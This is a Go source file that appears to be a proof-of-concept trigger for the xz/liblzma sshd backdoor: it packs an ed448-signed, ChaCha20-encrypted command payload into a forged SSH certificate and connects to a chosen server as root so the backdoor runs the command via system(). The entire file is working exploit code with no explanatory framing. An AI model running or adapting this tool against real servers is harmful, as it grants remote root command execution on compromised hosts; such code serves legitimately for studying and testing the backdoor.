package main

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/ed25519"
	"crypto/elliptic"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"

	"github.com/cloudflare/circl/sign/ed448"
	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/ssh"
)

var (
	addr  = flag.String("addr", "127.0.0.1:2222", "ssh server address")
	seedn = flag.String("seed", "0", "ed448 seed, must match xz backdoor key")
	cmd   = flag.String("cmd", "id > /tmp/.xz", "command to run via system()")
)

type xzPublicKey struct {
	buf []byte
}

func (k *xzPublicKey) Type() string {
	return "ssh-rsa"
}

func (k *xzPublicKey) Marshal() []byte {
	e := new(big.Int).SetInt64(int64(1))
	wirekey := struct {
		Name string
		E    *big.Int
		N    []byte
	}{
		ssh.KeyAlgoRSA,
		e,
		k.buf,
	}
	return ssh.Marshal(wirekey)
}

func (k *xzPublicKey) Verify(data []byte, sig *ssh.Signature) error {
	return nil
}

type xzSigner struct {
	signingKey    ed448.PrivateKey
	encryptionKey []byte
	hostkey       []byte
	cert          *ssh.Certificate
}

func (s *xzSigner) PublicKey() ssh.PublicKey {
	if s.cert != nil {
		return s.cert
	}

	var hdr bytes.Buffer
	binary.Write(&hdr, binary.LittleEndian, uint32(2))
	binary.Write(&hdr, binary.LittleEndian, uint32(1))
	binary.Write(&hdr, binary.LittleEndian, uint64(0))

	var payload bytes.Buffer
	binary.Write(&payload, binary.LittleEndian, uint32(0))
	binary.Write(&payload, binary.LittleEndian, uint8(0))
	payload.Write([]byte(*cmd))
	payload.Write([]byte{0})

	var md bytes.Buffer
	md.Write(hdr.Bytes()[:4])
	md.Write(payload.Bytes()[:5])
	md.Write(s.hostkey)
	signature := ed448.Sign(s.signingKey, md.Bytes(), "")

	var buf bytes.Buffer
	buf.Write(signature)
	buf.Write(payload.Bytes())
	hdr.Write(decrypt(buf.Bytes(), s.encryptionKey[:32], hdr.Bytes()[:16]))
	hdr.Write(bytes.Repeat([]byte{0}, 256-hdr.Len()))

	n := big.NewInt(1)
	n.Lsh(n, 2048)
	pub, err := ssh.NewPublicKey(&rsa.PublicKey{N: n, E: 0x10001})
	fatalIfErr(err)

	s.cert = &ssh.Certificate{
		CertType: ssh.UserCert,
		SignatureKey: &xzPublicKey{
			buf: hdr.Bytes(),
		},
		Signature: &ssh.Signature{
			Format: "ssh-rsa",
			Blob:   []byte("\x00"),
		},
		Key: pub,
	}
	fmt.Printf("%s", hex.Dump(s.cert.Marshal()))
	return s.cert
}

func (s *xzSigner) Sign(rand io.Reader, data []byte) (*ssh.Signature, error) {
	return nil, nil
}

func (s *xzSigner) HostKeyCallback(_ string, _ net.Addr, key ssh.PublicKey) error {
	h := sha256.New()

	cpk := key.(ssh.CryptoPublicKey).CryptoPublicKey()
	switch pub := cpk.(type) {
	case *rsa.PublicKey:
		w := struct {
			E *big.Int
			N *big.Int
		}{
			big.NewInt(int64(pub.E)),
			pub.N,
		}
		h.Write(ssh.Marshal(&w))
	case *ecdsa.PublicKey:
		keyBytes := elliptic.Marshal(pub.Curve, pub.X, pub.Y)
		w := struct {
			Key []byte
		}{
			[]byte(keyBytes),
		}
		h.Write(ssh.Marshal(&w))
	case ed25519.PublicKey:
		w := struct {
			KeyBytes []byte
		}{
			[]byte(pub),
		}
		h.Write(ssh.Marshal(&w))
	default:
		log.Fatalf("unsupported hostkey alg: %s\n", key.Type())
		return nil
	}
	msg := h.Sum(nil)
	s.hostkey = msg[:32]

	return nil
}

func decrypt(src, key, iv []byte) []byte {
	dst := make([]byte, len(src))
	c, err := chacha20.NewUnauthenticatedCipher(key, iv[4:16])
	fatalIfErr(err)
	c.SetCounter(binary.LittleEndian.Uint32(iv[:4]))
	c.XORKeyStream(dst, src)
	return dst
}

func fatalIfErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	flag.Parse()

	if len(*cmd) > 120 {
		fmt.Printf("cmd too long, should not exceed 120 characters\n")
		return
	}

	var seed [ed448.SeedSize]byte
	sb, ok := new(big.Int).SetString(*seedn, 10)
	if !ok {
		fmt.Printf("invalid seed int\n")
		return
	}
	sb.FillBytes(seed[:])

	signingKey := ed448.NewKeyFromSeed(seed[:])
	xz := &xzSigner{
		signingKey:    signingKey,
		encryptionKey: signingKey[ed448.SeedSize:],
	}
	config := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(xz),
		},
		HostKeyCallback: xz.HostKeyCallback,
	}
	client, err := ssh.Dial("tcp", *addr, config)
	if err != nil {
		fatalIfErr(err)
	}
	defer client.Close()
}
